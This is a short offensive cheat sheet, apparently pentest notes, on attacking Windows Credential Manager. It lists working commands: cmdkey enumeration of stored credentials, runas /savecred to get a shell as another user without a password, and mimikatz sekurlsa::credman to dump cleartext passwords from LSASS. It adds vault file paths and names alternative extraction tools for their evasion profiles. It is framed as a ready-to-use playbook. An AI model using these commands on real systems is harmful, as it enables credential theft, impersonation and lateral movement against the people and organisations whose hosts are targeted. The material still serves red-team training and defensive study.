# Attacking Windows Credential Manager

Enumerate stored creds for the current user — look for `Domain Password` type entries:

```cmd
cmdkey /list
```

`Domain:interactive=<HOST>\<USER>` = stored interactive logon cred → impersonate directly, no password needed:

```cmd
runas /savecred /user:<DOMAIN>\<USER> cmd
```

Dump credman from LSASS — pulls cleartext passwords for any stored Credential Manager entries with active sessions:

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

> [!tip] `cmdkey /list` before running anything else — if a `Domain Password` entry exists, `runas /savecred` gets you a shell as that user instantly, no cracking needed.

> [!warning] Credential Guard (enabled on modern hardened hosts via VBS) protects DPAPI masterkeys in a secured enclave — sekurlsa::credman will return nothing useful. Check if it's enabled before wasting time on LSASS.

Vault locations if you want to inspect manually: `%UserProfile%\AppData\Local\Microsoft\Vault\` `%UserProfile%\AppData\Local\Microsoft\Credentials\`

Alternative tools for DPAPI/Credential Manager extraction: SharpDPAPI, LaZagne, DonPAPI — same material, different evasion profiles.